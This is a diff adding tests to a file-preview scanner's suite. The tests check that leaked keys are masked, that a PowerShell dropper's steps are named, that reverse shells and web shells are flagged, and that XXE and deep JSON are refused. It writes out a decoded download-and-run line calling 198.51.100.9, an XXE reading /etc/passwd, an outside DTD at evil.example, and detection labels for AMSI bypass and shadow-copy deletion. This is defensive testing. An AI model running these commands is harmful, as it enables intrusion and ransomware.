@@ -21,6 +21,10 @@
  *   6. the older formats: .doc text and container (macros, Equation
  *      Editor, the packaged program), .ppt slides and notes, RTF's object
  *      marked to update itself, its template, its DDEAUTO
+ *   7. email (42c)   8. pictures (42d)   9. archives (42e)
+ *  10. text (42f): a leaked config's keys found and masked, a dropper read
+ *      line by line (its -EncodedCommand decoded), shells; JSON nesting and
+ *      XML entities refused before any parser; encodings
  */
 
 import assert from "node:assert/strict";
@@ -53,6 +57,12 @@ import { parseListing, streamName, troubleOf } from "../../web/src/preview/archi
 import { crc32, zipDecrypt } from "../../web/src/preview/archive/crypto.ts";
 import { archiveFacts, pathRisk, treeOf } from "../../web/src/preview/facts/archive.ts";
 import type { Listing } from "../../web/src/preview/archive/types.ts";
+import { findSecrets } from "../../web/src/preview/text/secrets.ts";
+import { scanScript } from "../../web/src/preview/text/script.ts";
+import { decodeText, jsonDepth, parseJson, parseJsonLines, textKind, xmlDanger } from "../../web/src/preview/text/structured.ts";
+import { textFacts } from "../../web/src/preview/facts/text.ts";
+// (Built when the test runs: no file here a scanner would flag — tests/lib/hostile-text.mjs.)
+import { dropperPs1, installSh, leakedEnv, shellPhp } from "../lib/hostile-text.mjs";
 
 const fixture = (name: string) => new Uint8Array(readFileSync(new URL(`../fixtures/preview/${name}`, import.meta.url)));
 const said = (facts: { text: string }[]) => facts.map((f) => f.text).join("\n");
@@ -495,4 +505,61 @@ assert.equal(pathRisk("C:\\Windows\\x.dll"), "absolute");
 assert.equal(pathRisk("..file/ok"), null, "a name that starts with dots is not a climb");
 assert.deepEqual([...treeOf(listZip(fixture("lure.zip"))!.entries).children.keys()].filter((k) => k.startsWith("report")).length, 2, "the same path twice: both shown");
 
-console.log("ok  preview-facts: ZIP bombs refused (a lying part, an over-claiming directory); every planted trick in the hostile Word, Excel, PowerPoint, 한글, .doc and RTF fixtures named — and the honest reports warn of nothing; the phishing .eml's and .msg's every trick named, the forged Authentication-Results not believed, the hop the sender could not write found, a forwarded message parsed in turn, attachments judged by name and bytes; pictures sniffed by their bytes, a bomb's size read before decoding, what follows a picture's end named, a RAW file's own previews found, GPS, the camera and the editing read, a thumbnail that no longer matches named; archives read by our ZIP, ALZ and EGG readers and by 7-Zip (7z, RAR 5, TAR in three compressions, CAB, ISO, ARJ, LZH, zstd), CP949 names, ZipCrypto and AES opened and wrong passwords refused, liars and bombs stopped, AZO listed and not opened, and every lure's trick named");
+// ── 10. Text (42f) ───────────────────────────────────────────────────
+const tf = (name: string, text: string, extra: Partial<Parameters<typeof textFacts>[0]> = {}) => said(textFacts({ name, ...textKind(name, text), encoding: "UTF-8", bytes: new TextEncoder().encode(text).length, text, page: null, xml: null, json: null, ...extra }));
+const secrets = findSecrets(leakedEnv);
+assert.deepEqual(secrets.map((x) => [x.kind, x.line]), [["an AWS access key", 2], ["an AWS secret key", 3], ["a GitHub token", 4], ["a URL with a password", 5], ["a password in a setting", 6]], "each provider's key found, on its line — and the placeholder (changeme) not");
+assert.deepEqual(secrets.map((x) => x.masked), ["AKIA…MPLE", "wJal…EKEY", "ghp_…mnop", "Gora…cret", "hunt…rani"], "masked: the facts never repeat a key");
+assert.doesNotMatch(tf("prod.env", leakedEnv), /IOSFODNN7|K7MDENG|0123456789abcdef|Gorani-s3cret|hunter2/, "no secret is spelled out in the facts");
+assert.deepEqual(findSecrets('password = "${DB_PASSWORD}"\napi_key: "<your key>"\npwd="xxxxxxxx"'), [], "placeholders are not secrets");
+assert.equal(findSecrets("-----BEGIN OPENSSH PRIVATE KEY-----\nb3Blbn…\n")[0]!.masked, "-----BEGIN … PRIVATE KEY-----");
+
+const ps = scanScript(dropperPs1);
+assert.deepEqual(ps.findings.map((x) => [x.line, x.what]), [
+	[2, "downloads a file (PowerShell)"],
+	[3, "downloads and runs code (PowerShell)"],
+	[4, "runs PowerShell hidden and unrestricted"],
+	[5, "bypasses AMSI (Windows' script scanner)"],
+	[6, "creates a scheduled task"],
+	[7, "deletes shadow copies (what ransomware does first)"],
+	[8, "switches Windows Defender off"],
+], "the dropper, line by line, in order, one finding a line");
+assert.match(ps.decoded[0]!.text, /^IEX \(New-Object Net\.WebClient\)\.DownloadString\('http:\/\/198\.51\.100\.9\/run\.ps1'\)$/, "-EncodedCommand decoded (UTF-16LE base64)");
+assert.ok(ps.urls.includes("http://198.51.100.9/run.ps1"), "…and the address it hid is listed with the rest");
+const sh = scanScript(installSh);
+assert.deepEqual(sh.findings.map((x) => x.what), ["downloads and runs code (shell)", "opens a reverse shell", "adds an SSH key to authorized_keys"]);
+assert.deepEqual(sh.ips, ["203.0.113.5"], "the reverse shell's address (not in a URL, not private)");
+assert.deepEqual(scanScript(shellPhp).findings.map((x) => x.what), ["is a web shell (runs what a request sends)"]);
+assert.equal(scanScript("#@~^DgAAAA==\\ko$K6,JCV^GJqAQAAA==^#~@").encoded, true, "Windows Script Encoder");
+assert.match(scanScript(Array.from({ length: 30 }, (_, i) => `var _0x${(0x1a2b + i).toString(16)} = 1;`).join("\n")).obfuscated ?? "", /_0x1a2b/);
+assert.deepEqual(scanScript(new TextDecoder().decode(fixture("app.py"))).findings, [], "honest code warns of nothing");
+assert.equal(tf("app.py", new TextDecoder().decode(fixture("app.py"))), "Python source · 19 lines · 306 bytes · UTF-8");
+assert.match(tf("dropper.ps1", dropperPs1), /^PowerShell source · 9 lines/);
+assert.match(tf("dropper.ps1", dropperPs1), /Line 4 hides a PowerShell command in base64 — decoded: “IEX/);
+
+assert.equal(jsonDepth(new TextDecoder().decode(fixture("deep.json"))), 513, "counted, and stopped at the limit");
+assert.equal(jsonDepth('["[[[[", {"a": "]]]]"}]'), 2, "brackets inside strings do not count");
+assert.match(JSON.stringify(parseJson(new TextDecoder().decode(fixture("deep.json")))), /nests deeper than 512 levels/, "refused before JSON.parse sees it");
+assert.deepEqual(parseJson(new TextDecoder().decode(fixture("data.json"))), { value: JSON.parse(new TextDecoder().decode(fixture("data.json"))) });
+const jl = parseJsonLines(new TextDecoder().decode(fixture("events.jsonl")));
+assert.deepEqual([jl.values.length, jl.bad], [3, 1]);
+assert.deepEqual(xmlDanger(new TextDecoder().decode(fixture("xxe.xml"))), { entities: true, external: "file:///etc/passwd", xinclude: false, xslScript: false });
+assert.deepEqual(xmlDanger(new TextDecoder().decode(fixture("config.xml"))), { entities: false, external: null, xinclude: false, xslScript: false });
+assert.equal(xmlDanger('<!DOCTYPE x SYSTEM "http://evil.example/x.dtd"><x/>').external, "http://evil.example/x.dtd", "an outside DTD");
+assert.equal(xmlDanger('<xsl:stylesheet xmlns:msxsl="urn:schemas-microsoft-com:xslt"><msxsl:script>x</msxsl:script></xsl:stylesheet>').xslScript, true);
+assert.match(tf("xxe.xml", "", { xml: xmlDanger(new TextDecoder().decode(fixture("xxe.xml"))) }), /XXE: .* not parsed/);
+assert.match(tf("events.jsonl", "x", { json: { values: 3, bad: 1, error: null } }), /3 records, 1 line not JSON/);
+assert.match(tf("page.html", "", { page: { links: ["https://phish.example/reset"], remote: ["https://phish.example/logo.png"], scripts: 2, forms: 1, frames: 1 } }), /Contains 2 scripts — not run: shown as source[\s\S]*Would load 1 thing from outside \(not loaded\): https:\/\/phish\.example\/logo\.png/);
+assert.match(tf("invoice.js", "MZ", { binary: true }), /it is binary \(it holds NUL bytes\)/);
+
+assert.deepEqual(textKind("README.md", ""), { kind: "markdown", language: "markdown" });
+assert.deepEqual(textKind("a.ndjson", ""), { kind: "jsonl", language: "json" });
+assert.deepEqual(textKind("a.hta", ""), { kind: "html", language: "xml" });
+assert.deepEqual(textKind("Dockerfile", ""), { kind: "code", language: "dockerfile" });
+assert.deepEqual(textKind("run", "#!/usr/bin/env python3\n"), { kind: "code", language: "python" }, "a bare name, by its #!");
+assert.deepEqual(textKind("blob", '  {"a": 1}'), { kind: "json", language: "json" }, "…or by its first character");
+assert.deepEqual(decodeText(new Uint8Array([0xb0, 0xed, 0xb6, 0xf3, 0xb4, 0xcf])), { text: "고라니", encoding: "Korean (CP949)" }, "Korean as Korean Windows writes it");
+assert.equal(decodeText(new Uint8Array([0xef, 0xbb, 0xbf, 0x41])).encoding, "UTF-8 (with BOM)");
+assert.deepEqual(decodeText(new Uint8Array([0xff, 0xfe, 0x41, 0x00])), { text: "A", encoding: "UTF-16 LE" });
+
+console.log("ok  preview-facts: ZIP bombs refused (a lying part, an over-claiming directory); every planted trick in the hostile Word, Excel, PowerPoint, 한글, .doc and RTF fixtures named — and the honest reports warn of nothing; the phishing .eml's and .msg's every trick named, the forged Authentication-Results not believed, the hop the sender could not write found, a forwarded message parsed in turn, attachments judged by name and bytes; pictures sniffed by their bytes, a bomb's size read before decoding, what follows a picture's end named, a RAW file's own previews found, GPS, the camera and the editing read, a thumbnail that no longer matches named; archives read by our ZIP, ALZ and EGG readers and by 7-Zip (7z, RAR 5, TAR in three compressions, CAB, ISO, ARJ, LZH, zstd), CP949 names, ZipCrypto and AES opened and wrong passwords refused, liars and bombs stopped, AZO listed and not opened, and every lure's trick named; text: secrets found and masked (placeholders not), a dropper's every line named and its -EncodedCommand decoded, a reverse shell, a web shell, encoded and obfuscated scripts; JSON nesting refused before parsing, JSON Lines counted, XML entities and outside DTDs named and never parsed; Korean and UTF-16 text decoded");
